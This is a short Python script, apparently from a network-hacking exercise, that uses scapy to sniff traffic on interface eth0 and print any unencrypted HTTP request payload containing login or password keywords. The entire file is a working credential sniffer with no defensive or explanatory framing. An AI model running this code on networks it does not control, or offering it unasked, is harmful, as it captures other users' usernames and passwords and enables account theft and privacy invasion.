#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "usr", "name", "login", "mail",
                    "password", "pass", "pwd"]
        if any(keyword in str(load) for keyword in keywords):
            print(load)


sniff("eth0")
